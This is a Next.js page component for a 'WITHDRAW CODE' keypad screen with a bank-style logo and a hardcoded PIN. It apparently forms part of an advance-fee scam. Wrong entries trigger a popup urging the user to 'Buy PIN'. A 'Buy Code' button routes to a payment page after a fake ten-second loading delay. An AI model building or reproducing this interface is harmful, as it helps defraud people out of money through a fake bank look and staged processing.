"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import LoadingOverlay from "@/components/loading-overlay"

export default function PinPage() {
  const router = useRouter()
  const [pin, setPin] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [showInvalidPin, setShowInvalidPin] = useState(false)
  const correctPin = "59089490"

  const handleNumberClick = (num: string) => {
    if (pin.length < 8) {
      setPin((prev) => prev + num)
    }
  }

  const handleClearClick = () => {
    setPin((prev) => prev.slice(0, -1))
  }

  const handleSubmit = () => {
    setIsLoading(true)

    setTimeout(() => {
      setIsLoading(false)

      if (pin === correctPin) {
        router.push("/withdraw/success")
      } else {
        setShowInvalidPin(true)
      }
    }, 5000)
  }

  const handleBuyCode = () => {
    setIsLoading(true)

    setTimeout(() => {
      setIsLoading(false)
      router.push("/withdraw/payment")
    }, 10000)
  }

  return (
    <main className="flex min-h-screen flex-col items-center p-4 bg-black">
      <div className="w-full max-w-md mt-8 flex flex-col items-center">
        {/* Bank Logo */}
        <div className="mb-6">
          <div className="w-16 h-16 relative">
            <svg viewBox="0 0 100 100" className="w-full h-full text-white">
              <path d="M50 10 L90 40 L90 90 L10 90 L10 40 Z" fill="white" />
              <rect x="25" y="45" width="10" height="35" fill="#4CAF50" />
              <rect x="45" y="45" width="10" height="35" fill="#4CAF50" />
              <rect x="65" y="45" width="10" height="35" fill="#4CAF50" />
              <rect x="15" y="80" width="70" height="5" fill="#4CAF50" />
              <path d="M50 20 L80 40 L20 40 Z" fill="#4CAF50" />
            </svg>
          </div>
        </div>

        <h1 className="text-white text-xl font-bold mb-6">Enter Your WITHDRAW CODE</h1>

        {/* PIN Input */}
        <div className="w-full bg-white p-4 mb-6 rounded-md">
          <div className="h-8 text-center text-2xl tracking-widest">{pin ? "*".repeat(pin.length) : ""}</div>
        </div>

        {/* Keypad */}
        <div className="grid grid-cols-3 gap-4 w-full mb-6">
          {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
            <button
              key={num}
              onClick={() => handleNumberClick(num.toString())}
              className="bg-green-500 text-white text-2xl font-bold p-4 rounded-md"
            >
              {num}
            </button>
          ))}
          <button onClick={handleClearClick} className="bg-green-500 text-white text-2xl font-bold p-4 rounded-md">
            ×
          </button>
          <button
            onClick={() => handleNumberClick("0")}
            className="bg-green-500 text-white text-2xl font-bold p-4 rounded-md"
          >
            0
          </button>
          <button onClick={handleSubmit} className="bg-green-500 text-white text-2xl font-bold p-4 rounded-md">
            ✓
          </button>
        </div>

        <button onClick={handleBuyCode} className="bg-green-500 text-black px-6 py-2 rounded-md font-medium">
          Buy Code
        </button>
      </div>

      {/* Invalid PIN Popup - Smaller with red button */}
      {showInvalidPin && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-4 rounded-lg w-full max-w-xs">
            <h2 className="text-lg font-bold text-gray-800 mb-2">Invalid PIN</h2>
            <p className="text-gray-700 mb-4 text-sm">The PIN you entered is incorrect.</p>
            <div className="flex justify-end">
              <button
                onClick={() => {
                  setShowInvalidPin(false)
                  setPin("")
                }}
                className="px-3 py-1 bg-gray-200 text-gray-800 rounded-md mr-2 text-sm"
              >
                Cancel
              </button>
              <button
                onClick={() => {
                  setShowInvalidPin(false)
                  handleBuyCode()
                }}
                className="px-3 py-1 bg-red-500 text-white rounded-md text-sm"
              >
                Buy PIN
              </button>
            </div>
          </div>
        </div>
      )}

      {isLoading && <LoadingOverlay />}
    </main>
  )
}
